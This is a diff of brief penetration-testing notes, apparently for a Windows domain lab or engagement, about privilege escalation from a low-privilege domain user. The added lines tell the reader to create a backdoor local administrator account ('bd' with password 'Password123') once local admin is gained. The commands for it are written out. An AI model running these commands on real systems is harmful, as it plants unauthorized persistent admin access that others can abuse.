@@ -1,5 +1,12 @@
 Should have low priv domain user to connect to first box, if not, initial foothold should be trivial.
 
+
+IMPORTANT!!!!! : WHEN YOU GET LOCAL ADMIN, ADD A BACKDOOR LOCAL ADMIN ACCOUNT FOR EASY ACCESS.
+
+net user /add bd Password123
+
+net localgroup administrators bd
+
 UNPRIVILEGED.
 
 whoami /priv
